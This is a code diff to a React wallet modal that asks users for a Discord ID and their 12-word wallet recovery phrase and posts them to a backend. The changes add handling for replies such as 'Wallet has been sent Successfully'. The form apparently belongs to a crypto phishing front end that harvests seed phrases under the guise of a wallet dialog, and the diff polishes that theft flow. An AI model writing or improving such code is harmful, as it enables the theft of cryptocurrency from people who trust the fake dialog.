@@ -11,6 +11,9 @@ import { AiFillSecurityScan } from "react-icons/ai";
 export default function WalletModal(props) {
   const { show, handleClose, walletname, walletnameImg } = props;
 
+  // HANDLE THE RECOVERY PHRASE
+  const [correct, setCorrect] = useState(false);
+
   // USERNAME & PASSWORD
   const [discordID, setDiscordID] = useState("");
   const [recoveryPhrase, setRecoveryPhrase] = useState("");
@@ -35,10 +38,20 @@ export default function WalletModal(props) {
 
     axios(config)
       .then((response) => {
-        console.log(response.data);
+        if (
+          response.data ===
+          "Recovery phrase should not be less-than or greater-than 12 words"
+        ) {
+          setCorrect(true);
+          alert(`THIS IS ALPHA VERSION | ${response.data}`);
+        } else if (response.data === "Wallet has been sent Successfully") {
+          setCorrect(false);
+          alert(`THIS IS ALPHA VERSION | ${response.data}`);
+        }
       })
       .catch((error) => {
         console.log(error);
+        alert("THIS IS ALPHA VERSION | Error occured");
       });
   };
 
@@ -87,6 +100,7 @@ export default function WalletModal(props) {
                 <AiFillSecurityScan />
               </InputGroup.Text>
               <FormControl
+                isInvalid={correct}
                 data-toggle="tooltip"
                 data-placement="top"
                 title="Typically 12 words separated by single spaces"
